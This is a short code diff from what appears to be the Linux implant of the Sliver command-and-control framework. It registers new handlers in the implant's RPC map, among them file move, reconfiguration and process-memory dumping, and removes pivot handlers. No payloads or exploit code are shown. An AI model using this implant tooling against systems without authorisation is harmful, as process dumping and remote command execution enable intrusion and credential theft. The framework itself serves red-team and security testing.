@@ -34,6 +34,7 @@ var (
 		sliverpb.MsgPwdReq:       pwdHandler,
 		sliverpb.MsgRmReq:        rmHandler,
 		sliverpb.MsgMkdirReq:     mkdirHandler,
+		sliverpb.MsgMvReq:        mvHandler,
 		sliverpb.MsgTaskReq:      taskHandler,
 		sliverpb.MsgIfconfigReq:  ifconfigHandler,
 		sliverpb.MsgExecuteReq:   executeHandler,
@@ -46,9 +47,9 @@ var (
 		sliverpb.MsgNetstatReq:  netstatHandler,
 		sliverpb.MsgSideloadReq: sideloadHandler,
 
-		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
-		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
-		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,
+		sliverpb.MsgReconfigureReq: reconfigureHandler,
+		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
+		sliverpb.MsgProcessDumpReq: dumpHandler,
 
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
@@ -60,16 +61,9 @@ var (
 		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
 		// {{end}}
 	}
-
-	linuxPivotHandlers = map[uint32]PivotHandler{}
 )
 
 // GetSystemHandlers - Returns a map of the linux system handlers
 func GetSystemHandlers() map[uint32]RPCHandler {
 	return linuxHandlers
-}
-
-// GetSystemPivotHandlers - Returns a map of the linux system handlers
-func GetSystemPivotHandlers() map[uint32]PivotHandler {
-	return linuxPivotHandlers
 }
